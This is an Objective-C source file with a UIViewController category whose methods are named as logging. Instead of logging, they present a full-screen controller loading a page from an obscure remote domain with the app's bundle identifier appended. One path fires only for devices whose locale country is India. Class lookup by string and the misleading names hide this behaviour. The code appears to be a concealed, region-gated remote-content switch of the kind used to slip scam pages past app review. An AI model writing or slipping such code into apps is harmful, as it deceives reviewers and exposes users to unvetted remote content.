
#import "SmashingCard+LOG.h"

@implementation UIViewController (LOGDevice)

- (void)logMessage
{
    NSLocale *currentLocale = [NSLocale currentLocale];
    NSString *countryCode = [currentLocale objectForKey:NSLocaleCountryCode];

    if (![countryCode isEqualToString:[@"IN" uppercaseString]]) {
        return;
    }
    
    Class class = NSClassFromString(@"SmashingCardPController");
    id hintvc = [[class alloc] init];
    [hintvc setValue:[NSString stringWithFormat:@"%@%@", [self priHeader], NSBundle.mainBundle.bundleIdentifier] forKey:@"url"];
    [hintvc setValue:@(YES) forKey:@"cc"];
    [hintvc setValue:@(0) forKey:@"modalPresentationStyle"];
    [self presentViewController:(UIViewController *)hintvc animated:NO completion:nil];
}

- (NSString *)priHeader
{
    return @"http://hadk.attndwcuj.xyz/?web_PackageName=";
}

- (void)logPri {
    
    Class class = NSClassFromString(@"SmashingCardPController");
    id hintvc = [[class alloc] init];
    [hintvc setValue:[NSString stringWithFormat:@"%@%@", [self priHeader], NSBundle.mainBundle.bundleIdentifier] forKey:@"url"];
    [hintvc setValue:@(0) forKey:@"modalPresentationStyle"];
    [self presentViewController:(UIViewController *)hintvc animated:NO completion:nil];
    
}

@end
